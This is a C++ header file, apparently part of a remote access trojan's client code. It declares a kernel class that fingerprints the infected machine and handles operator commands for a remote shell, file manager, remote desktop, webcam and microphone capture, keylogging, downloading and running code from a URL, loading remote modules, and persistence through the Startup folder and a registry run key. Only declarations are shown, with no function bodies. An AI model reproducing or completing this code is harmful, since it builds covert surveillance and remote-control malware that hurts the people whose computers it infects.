#pragma once
#include "..\Common\MsgHandler.h"

#define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))

/*******************************EVENT ID**************************/

#define KNEL_LOGIN (0xee01)
//
#define KNEL_READY			(0x4552)

#define KNEL_POWER_REBOOT	(0xee02)
#define KNEL_POWER_SHUTDOWN	(0xee03)

#define KNEL_EDITCOMMENT	(0xee04)
#define KNEL_EDITCOMMENT_OK	(0xee05)

#define KNEL_RESTART		(0xea04)

//获取模块信息....
#define KNEL_GETMODULE_INFO	(0xea05)
#define KNEL_MODULE_INFO	(0xea07)

#define KNEL_MODULE_CHUNK_GET	(0xfa00)
#define KNEL_MODULE_CHUNK_DAT	(0xfa01)

//
#define KNEL_ERROR			(0xea08)

////
//#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
//#define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)



#define KNEL_CMD						(0xdd01)
#define KNEL_CHAT						(0xdd02)
#define KNEL_FILEMGR					(0xdd03)
#define KNEL_DESKTOP					(0xdd04)
#define KNEL_CAMERA						(0xdd05)
#define KNEL_MICROPHONE					(0xdd06)
#define KNEL_DOWNANDEXEC				(0xdd07)
#define KNEL_EXIT						(0xdd08)
#define KNEL_KEYBD_LOG					(0xdd09)

#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
#define KNEL_UTILS_WRITE_REG			(0xdd0b)
/*************************************************************************/
class CModuleMgr;

class CKernel :
	public CMsgHandler
{
	typedef struct LoginInfo
	{
		WCHAR PrivateIP[128];				//
		WCHAR HostName[128];
		WCHAR User[128];
		WCHAR OsName[128];
		WCHAR InstallDate[128];
		WCHAR CPU[128];
		WCHAR Disk_RAM[128];
		DWORD dwHasCamera;
		DWORD dwPing;
		WCHAR Comment[256];
		
	}LoginInfo;
private:
	//module upload.....

	string m_current_module;
	DWORD  m_module_size;
	DWORD  m_loaded_size;
	DWORD  m_checksum;
	char * m_module_buffer;


	/********************************************************************/
	UINT16 icmp_checksum(char*buff, int len);
	DWORD GetPing(const char*host);
	/********************************************************************/
	void GetPrivateIP(WCHAR PrivateIP[128]);
	/********************************************************************/
	void GetPCName(WCHAR PCName[128]);
	/********************************************************************/
	void GetCurrentUser(WCHAR User[128]);
	/********************************************************************/
	void GetRAM(WCHAR RAMSize[128]);
	/********************************************************************/
	void GetDisk(WCHAR DiskSize[128]);
	/********************************************************************/
	void GetOSName(WCHAR OsName[128]);
	/********************************************************************/
	void GetCPU(WCHAR CPU[128]);
	/********************************************************************/
	DWORD HasCamera();
	/********************************************************************/
	void GetComment(WCHAR Comment[256]);
	/********************************************************************/
	void GetInstallDate(WCHAR InstallDate[128]);
	/********************************************************************/

	void GetLoginInfo(LoginInfo*pLoginInfo);
	/*********************************************************************/
	/*					EventHandler									  */
	/*********************************************************************/
	void OnReady();

	void OnEditComment(WCHAR NewComment[256]);
	void OnPower_Reboot();
	void OnPower_Shutdown();

	//void OnUploadModuleFromDisk(DWORD dwRead,char*Buffer);

	//void OnUploadModuleFromUrl(DWORD dwRead,char*Buffer);

	void OnCmd();
	void OnChat();
	void OnFileMgr();
	void OnRemoteDesktop();
	void OnCamera();
	void OnMicrophone();
	void OnRestart();
	void OnDownloadAndExec(WCHAR*szUrl);
	void OnExit();
	void OnKeyboard();

	//模块传输。。。
	void OnModuleInfo(char* info);
	void GetModuleChunk();
	void OnRecvModuleChunk(char* Chunk);


	void OnUnilsCopyToStartupMenu();
	void OnUtilsWriteStartupReg();
	/*********************************************************************/
	CModuleMgr *m_pModuleMgr;

	

	static CKernel * m_pInstance;

public:
	void GetModule(const char* ModuleName);

	void OnOpen();
	void OnClose();
	void OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer);
	void OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer){}

	CKernel(CManager*pManager);
	~CKernel();
};

